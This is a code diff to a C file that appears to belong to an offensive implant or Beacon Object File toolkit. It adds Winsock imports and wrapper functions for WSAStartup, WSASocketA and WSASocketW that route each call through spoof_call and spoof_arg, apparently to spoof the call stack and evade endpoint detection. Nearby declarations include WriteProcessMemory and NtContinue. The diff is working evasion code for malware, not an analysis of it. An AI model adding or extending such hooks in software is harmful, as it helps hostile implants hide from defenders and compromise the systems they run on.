@@ -1,3 +1,4 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <wininet.h>
 #include <combaseapi.h>
@@ -33,6 +34,54 @@ DECLSPEC_IMPORT SIZE_T    WINAPI KERNEL32$VirtualQuery       ( LPCVOID, PMEMORY_
 DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$WriteProcessMemory ( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T * );
 DECLSPEC_IMPORT HRESULT   WINAPI OLE32$CoCreateInstance      ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
 DECLSPEC_IMPORT ULONG     NTAPI  NTDLL$NtContinue            ( CONTEXT *, BOOLEAN );
+
+DECLSPEC_IMPORT SOCKET    WINAPI WS2_32$WSASocketA           (int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD );
+DECLSPEC_IMPORT SOCKET    WINAPI WS2_32$WSASocketW           (int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD );
+DECLSPEC_IMPORT int       WINAPI WS2_32$WSAStartup           (WORD, LPWSADATA);
+
+
+int WINAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)
+{
+    FUNCTION_CALL call = { 0 };
+    call.ptr = (PVOID)(WS2_32$WSAStartup);
+    call.argc = 2;
+    call.args[0] = spoof_arg(wVersionRequested);
+    call.args[1] = spoof_arg(lpWSAData);
+    
+    return (int)spoof_call(&call);
+}
+
+SOCKET WINAPI _WSASocketW(int af, int type, int protocol, LPWSAPROTOCOL_INFOW lpProtocolInfo, GROUP g, DWORD dwFlags)
+{
+    FUNCTION_CALL call = { 0 };
+    call.ptr = (PVOID)(WS2_32$WSASocketW);
+    call.argc = 6;
+    call.args[0] = spoof_arg(af);
+    call.args[1] = spoof_arg(type);
+    call.args[2] = spoof_arg(protocol);
+    call.args[3] = spoof_arg(lpProtocolInfo);
+    call.args[4] = spoof_arg(g);
+    call.args[5] = spoof_arg(dwFlags);
+    
+    return (SOCKET)spoof_call(&call);
+}
+
+
+SOCKET WINAPI _WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
+{
+    FUNCTION_CALL call = { 0 };
+    call.ptr  = (PVOID)WS2_32$WSASocketA;
+    call.argc = 6;
+    call.args[0] = spoof_arg(af);
+    call.args[1] = spoof_arg(type);
+    call.args[2] = spoof_arg(protocol);
+    call.args[3] = spoof_arg(lpProtocolInfo);
+    call.args[4] = spoof_arg(g);
+    call.args[5] = spoof_arg(dwFlags);
+
+    return (SOCKET)spoof_call(&call);
+}
+
 
 BOOL WINAPI _HttpSendRequestA ( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
 {
